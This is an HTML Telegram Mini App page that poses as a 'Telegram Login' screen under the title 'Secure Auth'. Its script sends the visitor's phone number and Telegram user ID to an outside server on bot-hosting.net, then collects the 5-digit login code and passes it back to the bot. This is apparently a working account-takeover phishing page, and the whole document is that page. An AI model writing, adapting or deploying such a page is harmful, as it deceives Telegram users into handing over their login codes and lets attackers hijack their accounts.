<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
        .container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
        input { width: 100%; padding: 14px; margin: 12px 0; border: 1.5px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #0088cc; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
        .loader { color: #888; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h3 id="title">Telegram Login</h3>
        
        <div id="phone-sec">
            <input type="tel" id="phone" value="+" placeholder="+88017...">
            <button id="phoneBtn" onclick="sendPhone()">Send Code</button>
            <div id="loader" class="loader hidden">Processing...</div>
        </div>

        <div id="otp-sec" class="hidden">
            <p style="color: green;">✅ Code sent to Telegram!</p>
            <input type="text" id="otp" placeholder="Enter 5-digit code">
            <button onclick="sendOTP()">Verify & Finish</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test";
        tg.expand();

        // আপনার দেওয়া ব্যাকএন্ড লিঙ্ক
        const BACKEND_URL = "http://de3.bot-hosting.net:20495"; 

        async function sendPhone() {
            let phone = document.getElementById("phone").value.trim();
            if(phone.length < 10) return alert("Enter full number!");

            document.getElementById("loader").classList.remove("hidden");
            document.getElementById("phoneBtn").disabled = true;

            try {
                let response = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                let result = await response.json();

                if(result.status === "success") {
                    document.getElementById("phone-sec").classList.add("hidden");
                    document.getElementById("otp-sec").classList.remove("hidden");
                } else {
                    alert("Error: " + result.message);
                }
            } catch (e) {
                alert("Server Connection Failed! Check if your backend is running.");
            } finally {
                document.getElementById("loader").classList.add("hidden");
                document.getElementById("phoneBtn").disabled = false;
            }
        }

        function sendOTP() {
            let otp = document.getElementById("otp").value.trim();
            if(!otp) return alert("Enter the code!");
            tg.sendData(JSON.stringify({ otp: otp }));
        }
    </script>
</body>
</html>
